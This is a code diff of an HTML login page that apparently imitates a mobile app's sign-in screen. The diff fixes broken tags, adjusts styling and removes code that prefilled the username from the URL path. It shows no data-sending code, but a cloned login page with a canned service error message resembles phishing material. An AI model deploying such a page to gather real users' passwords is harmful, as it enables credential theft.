@@ -1,12 +1,12 @@
-!DOCTYPE html>
-html lang="en">
-head>
-  meta charset="UTF-8" />
-  meta name="viewport" content="width=device-width, initial-scale=1" />
-  title>Login</title>
-  script src="https://cdn.tailwindcss.com"></script>
-  link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
-  style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+  <style>
     @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
 
     body {
@@ -47,7 +47,7 @@ head>
     }
 
     #loginBtn {
-      transition: bottom 0.30s ease;
+      transition: bottom 0.3s ease;
       min-width: 75%;
     }
 
@@ -75,6 +75,7 @@ head>
       position: relative;
       top: -3px;
     }
+
     #password {
       position: relative;
       top: -2.7px;
@@ -110,51 +111,53 @@ head>
     h1 {
       position: relative;
       top: -2px;
-      font-size: 2.5rem;  /* enlarged from 1.75rem */
+      font-size: 2.5rem; /* Bigger Log In heading */
       font-weight: 500;
     }
   </style>
-body class="bg-white min-h-screen flex flex-col justify-between relative">
-  div class="pt-4 relative flex flex-col flex-grow main-container">
-    button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] text-2xl leading-none font-medium">
-      i class="fas fa-chevron-left"></i>
-    /button>
-    h1 class="mt-12 mb-8 text-center text-black font-medium font-sans">Log In</h1>
-    form id="loginForm" class="flex flex-col space-y-6">
-      div class="flex flex-col input-container">
-        label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
-        input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 pr-10 w-full" autocomplete="username" required />
-      /div>
-      div class="flex flex-col relative input-container">
-        label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
-        input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 pr-10 w-full" autocomplete="current-password" required />
-        button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
-          i id="eyeIcon" class="fas fa-eye-slash"></i>
-        /button>
-      /div>
-      p id="errorMsg" class="text-red-500 font-normal leading-tight hidden">
-        SS07: Device associated with high number of accounts. Learn more a href="#" class="text-blue-600 underline">here</a>.
-      /p>
-      label class="inline-flex items-center space-x-2 font-sans text-black input-container">
-        input type="checkbox" checked />
-        span>Save Login Info on your iCloud devices</span>
-      /label>
-      a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
-    /form>
-  /div>
+</head>
+<body class="bg-white min-h-screen flex flex-col justify-between relative">
+  <div class="pt-4 relative flex flex-col flex-grow main-container">
+    <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] text-2xl leading-none font-medium">
+      <i class="fas fa-chevron-left"></i>
+    </button>
+    <h1 class="mt-12 mb-8 text-center text-black font-medium font-sans">Log In</h1>
+    <form id="loginForm" class="flex flex-col space-y-6">
+      <div class="flex flex-col input-container">
+        <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">
+          USERNAME, EMAIL, OR PHONE
+        </label>
+        <input id="username" type="text" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 pr-10 w-full" autocomplete="username" required />
+      </div>
+      <div class="flex flex-col relative input-container">
+        <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
+        <input id="password" type="password" class="border-b border-gray-300 focus:outline-none focus:border-gray-400 pr-10 w-full" autocomplete="current-password" required />
+        <button type="button" aria-label="Toggle password visibility" class="absolute right-0 bottom-3 text-gray-400 text-lg" onclick="togglePassword()">
+          <i id="eyeIcon" class="fas fa-eye-slash"></i>
+        </button>
+      </div>
+      <p id="errorMsg" class="text-red-500 font-normal leading-tight hidden">
+        SS07: Device associated with high number of accounts. Learn more <a href="#" class="text-blue-600 underline">here</a>.
+      </p>
+      <label class="inline-flex items-center space-x-2 font-sans text-black input-container">
+        <input type="checkbox" checked />
+        <span>Save Login Info on your iCloud devices</span>
+      </label>
+      <a id="forgotPassword" href="#" class="text-[#0083ff] text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
+    </form>
+  </div>
 
-  button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>Log In</button>
+  <button id="loginBtn" type="button" class="bg-gray-400 text-white font-medium text-lg py-3 rounded-full fixed left-1/2 transform -translate-x-1/2 bottom-4" disabled>
+    Log In
+  </button>
 
-  script>
+  <script>
     document.addEventListener("DOMContentLoaded", function() {
       const usernameInput = document.getElementById("username");
       const passwordInput = document.getElementById("password");
       const loginBtn = document.getElementById("loginBtn");
       const errorMsg = document.getElementById("errorMsg");
       const forgotPassword = document.getElementById("forgotPassword");
-
-      const pathUsername = window.location.pathname.split("/")[1];
-      if(pathUsername) usernameInput.value = decodeURIComponent(pathUsername);
 
       function checkInputs() {
         if(usernameInput.value.trim() && passwordInput.value.trim()) {
@@ -220,6 +223,6 @@ body class="bg-white min-h-screen flex flex-col justify-between relative">
         if(e.key === "Enter" && !loginBtn.disabled) loginBtn.click();
       });
     });
-  /script>
-/body>
-/html>
+  </script>
+</body>
+</html>
